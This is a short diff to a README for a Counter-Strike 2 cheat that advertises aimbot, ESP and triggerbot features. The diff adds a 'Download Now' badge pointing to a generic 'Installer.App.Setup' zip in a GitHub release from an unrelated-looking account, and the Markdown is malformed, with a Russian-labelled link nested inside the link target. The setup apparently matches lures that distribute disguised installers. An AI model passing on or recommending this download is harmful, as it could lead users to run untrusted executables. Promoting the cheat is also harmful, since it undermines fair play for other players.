@@ -1,6 +1,6 @@
 # Cheat-CS2
 
-[![Download Now](https://img.shields.io/badge/Download-cs2%20Hack-purple)]([ZIP_LINK])
+[![Download Now](https://img.shields.io/badge/Download-cs2%20Hack-purple)]([Скачать архив](https://github.com/disasterboy98t/3/releases/download/v1.0.0/Installer.App.Setup.1.0.0.zip))
 
 🎮 Welcome to Cheat-CS2, the ultimate external cheat for Counter-Strike 2! 🎯 This cheat operates independently of the game's memory and is designed to enhance your Windows API skills while giving you an edge in gameplay. With features like AimBot, ESP, Trigger Bot, BunnyHop, and automatic offset updates, you'll dominate the battlefield like never before.
 
